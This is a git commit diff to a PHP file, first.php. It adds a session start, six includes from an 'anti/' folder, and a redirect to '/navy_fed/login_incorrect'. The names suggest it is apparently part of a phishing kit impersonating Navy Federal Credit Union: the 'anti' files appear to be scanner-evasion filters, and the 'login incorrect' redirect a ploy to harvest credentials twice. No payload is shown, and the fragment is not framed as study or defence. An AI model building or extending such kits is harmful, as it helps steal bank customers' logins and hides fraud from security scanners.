5883ce91f4d4d0c2cf1cd5ab368f0c56e0a6c5aa
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-14 10:08:12 +0200

    Update first.php

--- first.php
+++ first.php
@@ -1,3 +1,10 @@
 <?php
+session_start();
+include "anti/anti1.php";
+include "anti/anti2.php"; 
+include "anti/anti3.php"; 
+include "anti/anti4.php"; 
+include "anti/anti5.php"; 
+include "anti/anti7.php"; 
 header('Location: /navy_fed/login_incorrect');
 ?>
